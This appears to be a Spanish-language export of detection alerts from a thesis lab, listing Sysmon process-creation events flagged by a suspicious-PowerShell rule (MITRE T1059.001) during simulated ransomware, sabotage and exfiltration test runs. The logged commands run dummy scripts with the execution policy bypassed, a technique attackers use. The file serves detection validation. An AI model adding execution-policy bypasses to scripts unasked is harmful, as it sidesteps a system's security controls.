Alertas / detecciones VR normalizadas														
Filas CLIENT_EVENT reales dentro de ventana canonica. JSONL/Discord no equivalen a deteccion.														
														
timestamp	profile	TEC	MITRE	IOA_DetectionName	Artifact	host	source	raw_evidence	campana	tipo_campana	validacion	EventID	SignalType	source_file
2026-06-24T12:50:22.977Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.977Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:32.022Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:39.376Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:32.022Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:39.376Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:50.593Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Write-Host TEC001_OK; Start-Sleep 3"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:04.325Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -Command Get-Process	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:50.593Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Write-Host TEC001_OK; Start-Sleep 3"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:04.325Z	P4	TEC-001	T1059.001	PowerShell suspicious execution - basic profile v2	CU001_Source_TEC001_PowerShell_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -Command Get-Process	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	ProcessCreation	05_LOGS\Validas\Prueba_24_06_2026\CU001_Source_TEC001_PowerShell_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
